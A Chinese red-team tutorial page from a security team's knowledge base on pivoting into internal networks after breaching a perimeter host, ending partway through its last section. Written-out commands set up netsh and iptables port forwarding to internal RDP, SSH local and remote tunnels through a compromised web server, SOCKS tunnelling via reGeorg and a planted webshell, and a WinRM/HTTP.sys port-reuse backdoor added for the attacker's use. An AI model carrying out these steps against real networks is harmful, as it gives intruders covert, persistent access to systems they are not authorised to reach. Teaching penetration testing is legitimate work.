<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <title>【红队】构建通道漫游内网 | 狼组安全团队公开知识库</title>
    <meta name="description" content="">
    <meta name="generator" content="VuePress 1.7.1">
    <link rel="icon" href="./assets/logo.svg">
    <script type="text/javascript" src="./assets/js/push.js"></script>
    <meta name="description" content="致力于打造信息安全乌托邦">
    <meta name="referrer" content="never">
    <meta name="keywords" content="知识库,公开知识库,狼组,狼组安全团队知识库,knowledge">
    <link rel="preload" href="./assets/css/0.styles.60d6249c.css" as="style"><link rel="preload" href="./assets/js/app.5fb053b1.js" as="script"><link rel="preload" href="./assets/js/2.94dca18c.js" as="script"><link rel="preload" href="./assets/js/34.d5f8ba65.js" as="script"><link rel="prefetch" href="./assets/js/10.9cf6d20d.js"><link rel="prefetch" href="./assets/js/11.d2d5e112.js"><link rel="prefetch" href="./assets/js/12.37e4d1f4.js"><link rel="prefetch" href="./assets/js/13.75eba125.js"><link rel="prefetch" href="./assets/js/14.86fc914f.js"><link rel="prefetch" href="./assets/js/15.2825668e.js"><link rel="prefetch" href="./assets/js/16.c6d594af.js"><link rel="prefetch" href="./assets/js/17.ab498e1f.js"><link rel="prefetch" href="./assets/js/18.b2c0355c.js"><link rel="prefetch" href="./assets/js/19.e67f27d1.js"><link rel="prefetch" href="./assets/js/20.f11a3f2c.js"><link rel="prefetch" href="./assets/js/21.f01480ad.js"><link rel="prefetch" href="./assets/js/22.184f5cc8.js"><link rel="prefetch" href="./assets/js/23.b229caa2.js"><link rel="prefetch" href="./assets/js/24.d8c76931.js"><link rel="prefetch" href="./assets/js/25.528aef2c.js"><link rel="prefetch" href="./assets/js/26.0952eaab.js"><link rel="prefetch" href="./assets/js/27.9a8f264c.js"><link rel="prefetch" href="./assets/js/28.24400938.js"><link rel="prefetch" href="./assets/js/29.cd6ae29a.js"><link rel="prefetch" href="./assets/js/3.11a34ead.js"><link rel="prefetch" href="./assets/js/30.b61ca8dd.js"><link rel="prefetch" href="./assets/js/31.58b0e5aa.js"><link rel="prefetch" href="./assets/js/32.d9370d05.js"><link rel="prefetch" href="./assets/js/33.933b8c47.js"><link rel="prefetch" href="./assets/js/35.0e136e7c.js"><link rel="prefetch" href="./assets/js/36.c4eb21ad.js"><link rel="prefetch" href="./assets/js/37.1e81b653.js"><link rel="prefetch" href="./assets/js/38.67d3059e.js"><link rel="prefetch" href="./assets/js/39.35c2701b.js"><link rel="prefetch" href="./assets/js/4.c84b86db.js"><link rel="prefetch" href="./assets/js/40.54b1b950.js"><link rel="prefetch" href="./assets/js/41.0c16463a.js"><link rel="prefetch" href="./assets/js/42.5502f7af.js"><link rel="prefetch" href="./assets/js/43.761ddad5.js"><link rel="prefetch" href="./assets/js/44.6d31ca64.js"><link rel="prefetch" href="./assets/js/45.8b8b2438.js"><link rel="prefetch" href="./assets/js/46.55e447f6.js"><link rel="prefetch" href="./assets/js/47.0934ef81.js"><link rel="prefetch" href="./assets/js/48.bfbd0183.js"><link rel="prefetch" href="./assets/js/49.cb2f524e.js"><link rel="prefetch" href="./assets/js/5.94c3d09d.js"><link rel="prefetch" href="./assets/js/50.7cc28c0b.js"><link rel="prefetch" href="./assets/js/51.4bc6d681.js"><link rel="prefetch" href="./assets/js/52.c912124b.js"><link rel="prefetch" href="./assets/js/53.4423adbd.js"><link rel="prefetch" href="./assets/js/54.57b558e2.js"><link rel="prefetch" href="./assets/js/55.8e0c1ee9.js"><link rel="prefetch" href="./assets/js/56.22a425b5.js"><link rel="prefetch" href="./assets/js/57.32ada196.js"><link rel="prefetch" href="./assets/js/6.68fb1f52.js"><link rel="prefetch" href="./assets/js/7.1a56fa31.js"><link rel="prefetch" href="./assets/js/8.3865e42e.js"><link rel="prefetch" href="./assets/js/9.d418ed94.js">
    <link rel="stylesheet" href="./assets/css/0.styles.60d6249c.css">
  </head>
  <body>
    <div id="app" data-server-rendered="true"><div class="theme-container"><header class="navbar"><div class="ant-row"><div class="sidebar-button"><i aria-label="icon: bars" class="anticon anticon-bars"><svg viewBox="0 0 1024 1024" focusable="false" data-icon="bars" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M912 192H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 284H328c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h584c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM104 228a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0zm0 284a56 56 0 1 0 112 0 56 56 0 1 0-112 0z"></path></svg></i> <span></span></div> <div class="ant-col ant-col-xs-24 ant-col-sm-24 ant-col-md-6 ant-col-lg-5 ant-col-xl-5 ant-col-xxl-4"><a href="/./" class="router-link-active home-link"><img src="./assets/logo.svg" alt="狼组安全团队公开知识库" class="logo"> <span class="site-name">狼组安全团队公开知识库</span></a> <div class="search-box mobile-search"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div></div> <div class="ant-col ant-col-xs-0 ant-col-sm-0 ant-col-md-18 ant-col-lg-19 ant-col-xl-19 ant-col-xxl-20"><div class="search-box"><input aria-label="Search" autocomplete="off" spellcheck="false" value=""> <!----></div> <nav class="nav-links can-hide"><ul role="menu" id="nav" class="ant-menu ant-menu-horizontal ant-menu-root ant-menu-light"><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="0" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./" class="router-link-active">
          首页
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="1" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./guide/">
          使用指南
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="2" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/knowledge/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./knowledge/" class="router-link-active">
          知识库
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="3" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/how-to-contribute.html" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./guide/how-to-contribute.html">
          投稿文章
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="4" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/guide/changelog.html" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./guide/changelog.html">
          更新日志
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="display:none;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li><li role="menuitem" mode="horizontal" level="1" inlineIndent="24" renderMenuItem="function () { [native code] }" rootPrefixCls="ant-menu" index="5" parentMenu="[object Object]" manualRef="function () { [native code] }" eventKey="/opensource/" openTransitionName="slide-up" openKeys="" selectedKeys="/knowledge/hw/" triggerSubMenuAction="hover" subMenuKey="0-menu-" class="ant-menu-item"><a href="/./opensource/">
          开源项目
        </a></li><li role="menuitem" class="ant-menu-submenu ant-menu-submenu-horizontal ant-menu-overflowed-submenu" style="visibility:hidden;position:absolute;"><div aria-haspopup="true" class="ant-menu-submenu-title"><span>···</span><i class="ant-menu-submenu-arrow"></i></div></li></ul> <a href="https://github.com/wgpsec" target="_blank" rel="noopener noreferrer" class="repo-link"><i aria-label="icon: github" class="anticon anticon-github"><svg viewBox="64 64 896 896" focusable="false" data-icon="github" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M511.6 76.3C264.3 76.2 64 276.4 64 523.5 64 718.9 189.3 885 363.8 946c23.5 5.9 19.9-10.8 19.9-22.2v-77.5c-135.7 15.9-141.2-73.9-150.3-88.9C215 726 171.5 718 184.5 703c30.9-15.9 62.4 4 98.9 57.9 26.4 39.1 77.9 32.5 104 26 5.7-23.5 17.9-44.5 34.7-60.8-140.6-25.2-199.2-111-199.2-213 0-49.5 16.3-95 48.3-131.7-20.4-60.5 1.9-112.3 4.9-120 58.1-5.2 118.5 41.6 123.2 45.3 33-8.9 70.7-13.6 112.9-13.6 42.4 0 80.2 4.9 113.5 13.9 11.3-8.6 67.3-48.8 121.3-43.9 2.9 7.7 24.7 58.3 5.5 118 32.4 36.8 48.9 82.7 48.9 132.3 0 102.2-59 188.1-200 212.9a127.5 127.5 0 0 1 38.1 91v112.5c.8 9 0 17.9 15 17.9 177.1-59.7 304.6-227 304.6-424.1 0-247.2-200.4-447.3-447.5-447.3z"></path></svg></i></a></nav></div></div> <!----></header> <aside class="sidebar"><div><div class="ads"><div id="ads_3"><div class="ads_title">赞助商</div> <button type="button" class="ant-btn ant-btn-primary ant-btn-background-ghost"><span>成为赞助商</span></button></div></div> <div role="separator" id="reset-margin" class="ant-divider ant-divider-horizontal ant-divider-dashed"></div></div> <ul class="sidebar-links"><li><a href="/./knowledge/" aria-current="page" title="知识库广告位招租" class="sidebar-link">知识库广告位招租</a></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>Web安全</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>CTF</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading open"><span>红蓝对抗</span> <span class="arrow down"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <ul class="sidebar-links sidebar-group-items"><li><a href="/./knowledge/hw/" aria-current="page" title="分类简介" class="sidebar-link">分类简介</a></li><li><a href="/./knowledge/hw/boundary-info.html" title="【红队】 边界资产信息收集" class="sidebar-link">【红队】 边界资产信息收集</a></li><li><a href="/./knowledge/hw/checklist.html" title="【红队】常规Web打点-漏洞挖掘" class="sidebar-link">【红队】常规Web打点-漏洞挖掘</a></li><li><a href="/./knowledge/hw/net-proxy.html" aria-current="page" title="【红队】构建通道漫游内网" class="active sidebar-link">【红队】构建通道漫游内网</a><ul class="sidebar-sub-headers"><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#windows-netsh" title="Windows netsh" class="sidebar-link">Windows netsh</a></li><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#linux-ssh隧道-高权限用" title="Linux SSH隧道（高权限用）" class="sidebar-link">Linux SSH隧道（高权限用）</a></li><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#icmp隧道" title="ICMP隧道" class="sidebar-link">ICMP隧道</a></li><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#iptables正向端口转发" title="iptables正向端口转发" class="sidebar-link">iptables正向端口转发</a></li><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#regeorg-端口复用" title="reGeorg 端口复用" class="sidebar-link">reGeorg 端口复用</a></li><li class="sidebar-sub-header"><a href="/./knowledge/hw/net-proxy.html#http-sys端口复用后门" title="HTTP.sys端口复用后门" class="sidebar-link">HTTP.sys端口复用后门</a></li></ul></li><li><a href="/./knowledge/hw/webshell.html" title="【红队】权限维持之--WebShell" class="sidebar-link">【红队】权限维持之--WebShell</a></li><li><a href="/./knowledge/hw/cc.html" title="【红队】权限维持之--C2免杀" class="sidebar-link">【红队】权限维持之--C2免杀</a></li><li><a href="/./knowledge/hw/os-shell.html" title="【红队】权限维持之--系统后门" class="sidebar-link">【红队】权限维持之--系统后门</a></li><li><a href="/./knowledge/hw/to-root.html" title="【红队】权限维持之--权限提升" class="sidebar-link">【红队】权限维持之--权限提升</a></li><li><a href="/./knowledge/hw/lan-info.html" title="【红队】横向移动之--内网信息收集" class="sidebar-link">【红队】横向移动之--内网信息收集</a></li><li><a href="/./knowledge/hw/ntml-hash.html" title="【红队】横向移动之--散列值获取" class="sidebar-link">【红队】横向移动之--散列值获取</a></li><li><a href="/./knowledge/hw/domain-pentest.html" title="【红队】横向移动之--域渗透" class="sidebar-link">【红队】横向移动之--域渗透</a></li><li><a href="/./knowledge/hw/del-log.html" title="【红队】打扫战场--日志处理" class="sidebar-link">【红队】打扫战场--日志处理</a></li><li><a href="/./knowledge/hw/defense-assets.html" title="【蓝队】资产梳理" class="sidebar-link">【蓝队】资产梳理</a></li><li><a href="/./knowledge/hw/linux-baselinesec.html" title="【蓝队】Linux基线安全加固" class="sidebar-link">【蓝队】Linux基线安全加固</a></li><li><a href="/./knowledge/hw/windows-baselinesec.html" title="【蓝队】Windows基线安全加固" class="sidebar-link">【蓝队】Windows基线安全加固</a></li><li><a href="/./knowledge/hw/monitor-read.html" title="【蓝队】设备监控--研判" class="sidebar-link">【蓝队】设备监控--研判</a></li><li><a href="/./knowledge/hw/emergency-response.html" title="【蓝队】应急响应" class="sidebar-link">【蓝队】应急响应</a></li><li><a href="/./knowledge/hw/back-counter.html" title="【蓝队】溯源反制" class="sidebar-link">【蓝队】溯源反制</a></li></ul></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>代码审计</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li><li><section class="sidebar-group collapsable depth-0"><p class="sidebar-heading"><span>内网系列</span> <span class="arrow right"><i aria-label="icon: down" class="anticon anticon-down"><svg viewBox="64 64 896 896" focusable="false" data-icon="down" width="1em" height="1em" fill="currentColor" aria-hidden="true"><path d="M884 256h-75c-5.1 0-9.9 2.5-12.9 6.6L512 654.2 227.9 262.6c-3-4.1-7.8-6.6-12.9-6.6h-75c-6.5 0-10.3 7.4-6.5 12.7l352.6 486.1c12.8 17.6 39 17.6 51.7 0l352.6-486.1c3.9-5.3.1-12.7-6.4-12.7z"></path></svg></i></span></p> <!----></section></li></ul></aside> <main class="page"> <div class="theme-antdocs-content content__default"><h1 id="边界代理">边界代理 <a href="#边界代理" class="header-anchor">#</a></h1> <p><strong>遵循三个原则</strong></p> <ol><li><p><strong>稳定性</strong>（主要用于扫描）{ 支持高并发、自动断线重连 }</p></li> <li><p><strong>安全性</strong>（防止socks5直接被ban）{ 流量可加密、开放代理可设置认证 }</p></li> <li><p><strong>健壮性</strong>   { 支持多种协议方式、最好支持插件定制 }</p></li></ol> <p><strong>推荐工具</strong></p> <table><thead><tr><th>工具</th> <th>优点</th> <th>缺点</th></tr></thead> <tbody><tr><td><strong><a href="https://github.com/fatedier/frp" target="_blank" rel="noopener noreferrer">Frp<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></td> <td>稳定、支持断线重连（大流量不断线）<br>支持将代理端口放在本地（跳板机只开个frp服务端口）</td> <td>配置复杂，体积偏大</td></tr> <tr><td><strong><a href="https://github.com/ehang-io/nps" target="_blank" rel="noopener noreferrer">Nps<span><svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" x="0px" y="0px" viewBox="0 0 100 100" width="15" height="15" class="icon outbound"><path fill="currentColor" d="M18.8,85.1h56l0,0c2.2,0,4-1.8,4-4v-32h-8v28h-48v-48h28v-8h-32l0,0c-2.2,0-4,1.8-4,4v56C14.8,83.3,16.6,85.1,18.8,85.1z"></path> <polygon fill="currentColor" points="45.7,48.7 51.3,54.3 77.2,28.5 77.2,37.2 85.2,37.2 85.2,14.9 62.8,14.9 62.8,22.9 71.5,22.9"></polygon></svg> <span class="sr-only">(opens new window)</span></span></a></strong></td> <td>自带Web管理，一键启动<br><strong>多级代理友好</strong></td> <td>稳定性不如Frp<br>会在tmp生成文件</td></tr></tbody></table> <h1 id="端口转发-打17-010等漏洞">端口转发（打17_010等漏洞） <a href="#端口转发-打17-010等漏洞" class="header-anchor">#</a></h1> <h2 id="windows-netsh">Windows netsh <a href="#windows-netsh" class="header-anchor">#</a></h2> <p><code>netsh</code>仅支持TCP协议， 适用于<strong>双网卡</strong>服务器， 连接外网6666端口，就是连接到内网目标上面的3389。</p> <p><strong>启动转发</strong></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment">#查看现有规则</span>
netsh interface portproxy show all

<span class="token comment">#添加转发规则</span>
netsh interface portproxy <span class="token builtin class-name">set</span> v4tov4 <span class="token assign-left variable">listenaddress</span><span class="token operator">=</span>外网IP <span class="token assign-left variable">listenport</span><span class="token operator">=</span><span class="token number">6666</span> <span class="token assign-left variable">connectaddress</span><span class="token operator">=</span>内网IP <span class="token assign-left variable">connectport</span><span class="token operator">=</span><span class="token number">3389</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p><strong>取消转发</strong></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment">#删除转发规则</span>
netsh interface portproxy delete v4tov4 <span class="token assign-left variable">listenport</span><span class="token operator">=</span><span class="token number">6666</span>

<span class="token comment">#xp需要安装ipv6</span>
netsh interface ipv6 <span class="token function">install</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><h2 id="linux-ssh隧道-高权限用">Linux SSH隧道（高权限用） <a href="#linux-ssh隧道-高权限用" class="header-anchor">#</a></h2> <p>SSH一般是允许通过防火墙的，而且传输过程是加密的</p> <blockquote><p>测试环境如下图，VPS可访问Web服务器，但不能访问内网其它机器，Web服务器可访问内网其它机器。</p> <p>目标：以Web服务器为跳板访问内网其它机器。</p></blockquote> <p><img src="/images/image-20200619231457834.png" alt=""></p> <p><strong>本地转发</strong></p> <p>在<code>VPS（黑客）</code>上执行以下命令</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">ssh</span> -CfNg -L <span class="token number">1153</span>（VPS端口）:10.1.1.3（目标主机）:3389（目标端口）
root@192.168.0.3（跳板机，Web服务器，会要求输入密码）

<span class="token comment">#查看1153端口是否已经连接</span>
<span class="token function">netstat</span> -tulnp <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">&quot;1153&quot;</span>

<span class="token comment">#连接目标数据库服务器的远程桌面</span>
rdesktop <span class="token number">127.0</span>.0.1:1153
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><p>SSH进程的本地端口映射，将本地端口转发到远端指定机器的指定端口；</p> <p>本地端口转发是在本地监听一个端口，所有访问这个端口的流量都会通过SSH隧道传输到远端的对应端口。</p> <p><strong>远程转发</strong></p> <p>在<code>Web服务器</code>上执行如下命令</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">ssh</span> -CfNg -R <span class="token number">1122</span>（VPS端口）:10.1.1.3（目标主机，数据库）:3389（目标端口） root@192.168.0.5<span class="token punctuation">(</span>VPS的IP<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>访问<code>VPS</code>的1122端口，即可连接内网数据库服务器的3389</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>rdesktop <span class="token number">127.0</span>.0.1:1122
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>所有访问<code>VPS</code>的1122端口的流量都会通过SSH隧道传输到数据库服务器的3389端口</p> <h2 id="icmp隧道">ICMP隧道 <a href="#icmp隧道" class="header-anchor">#</a></h2> <p>项目地址：https://github.com/esrrhs/pingtunnel</p> <p>适用场景 ：特殊环境下icmp流量允许出网</p> <p>实现原理：客户端将TCP流量封装成icmp，然后发送给服务端，服务端再从ICMP包解析出正常TCP流量最后发向目标</p> <p><img src="/images/image-20200613145026593.png" alt=""></p> <h2 id="iptables正向端口转发">iptables正向端口转发 <a href="#iptables正向端口转发" class="header-anchor">#</a></h2> <p>1、编辑配置文件</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">vi</span> /etc/sysctl.conf
	net.ipv4.ip_forward <span class="token operator">=</span> <span class="token number">1</span><span class="token comment">#开启IP转发</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>2、关闭服务</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">service</span> iptables stop
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>3、配置规则</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token comment">#需要访问的内网地址：10.1.1.11（Windows）</span>
<span class="token comment">#内网边界web服务器：192.168.100.100（Linux）</span>
iptables -t nat -A PREROUTING --dst <span class="token number">192.168</span>.100.100 -p tcp --dport <span class="token number">3389</span> -j DNAT--to-destination <span class="token number">10.1</span>.1.11:3389

iptables -t nat -A POSTROUTING --dst <span class="token number">10.1</span>.1.11 -p tcp --dport <span class="token number">3389</span> -j SNAT --to-source <span class="token number">192.168</span>.100.100
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br></div></div><p>4、保存并重启服务</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code><span class="token function">service</span> iptables save <span class="token operator">&amp;&amp;</span> <span class="token function">service</span> iptables start
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>这时访问Web服务器的3389就能登录到内网机器的桌面了。</p> <h1 id="端口复用">端口复用 <a href="#端口复用" class="header-anchor">#</a></h1> <blockquote><p><strong>适用场景</strong></p> <p>需要占用一些已经开启的端口情况下（  server只对外开放指定端口，无法向外进行端口转发  、规避防火墙）</p> <p>当前机器不出网不出网情况下，留正向后门</p></blockquote> <h2 id="regeorg-端口复用">reGeorg 端口复用 <a href="#regeorg-端口复用" class="header-anchor">#</a></h2> <blockquote><p>网络情况：A只能连接B主机的80端口，A无法与C进行通信，且B无法与外网进行通信</p></blockquote> <p>项目地址： https://github.com/sensepost/reGeorg</p> <p>reGeorg是一个Python2.7环境下开发的一款结合Webshell进行端口复用的工具；</p> <p>能够将数据通过在本地建立的Socks服务转发到内网环境 ；</p> <p>reGeorg需要配合Webshell使用，并且需要一个良好的网络状况，Python环境必须安装<code>Urlib3</code></p> <p><strong>创建Socks5代理</strong></p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>python2 reGeorgSocksProxy.py -p <span class="token operator">&lt;</span>本地Socks5服务监听的端口<span class="token operator">&gt;</span> -u <span class="token operator">&lt;</span>Webshell地址<span class="token operator">&gt;</span>
python2 reGeorgSocksProxy.py -p <span class="token number">8888</span> -u http://xxx.com/shell.jsp
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>之后使用浏览器设置Socks代理，就能访问内网主机的端口了，或者结合 Proxifier 连接 3389</p> <h2 id="http-sys端口复用后门">HTTP.sys端口复用后门 <a href="#http-sys端口复用后门" class="header-anchor">#</a></h2> <blockquote><p>HTTP.sys驱动是IIS的主要组成部分，主要负责HTTP协议相关的处理，它有一个重要的功能叫<strong>Port Sharing</strong>，即端口共享；</p> <p>所有基于HTTP.sys驱动的HTTP应用可以共享同一个端口，只需要各自注册的url前缀不一样即可；</p> <p>使用Windows的远程管理服务WinRM，结合HTTP.sys驱动自带的端口复用功能，可实现端口复用后门</p></blockquote> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>netsh http show servicestate	<span class="token comment">#查看所有在HTTP.sys上注册过的url前缀</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>1、 开启WinRM服务</strong></p> <p>WinRm使用端口：<code>http 5985、https 5986</code></p> <p><code>Server 2012</code>及之后，已经默认开启WinRM并监听了<code>5985</code>端口</p> <p><code>Server 2008</code>及之前的系统</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>winrm quickconfig -q			<span class="token comment">#开启WinRM并自动从防火墙放行`5985`端口</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p><strong>2、 Server 2012配置，新增80端口Listerner</strong></p> <p>对于原本就开放了WinRM的机器（Server 2012），需要保留该端口，以免影响系统管理员正常使用</p> <p>同时还需要新增一个80端口的Listener供攻击者使用</p> <div class="language-bash line-numbers-mode"><pre class="language-bash"><code>winrm <span class="token builtin class-name">set</span> winrm/config/service @<span class="token punctuation">{</span>EnableCompatibilityHttpListener<span class="token operator">=</span><span class="token string">&quot;true&quot;</span><span class="token punctuation">}</span>

winrm e winrm/config/Listener	<span class="token comment">#查看80端口的Listener是否出现</span>
netsh http show servicestate	<span class="token comment">#查看是否新增了url前缀</span>
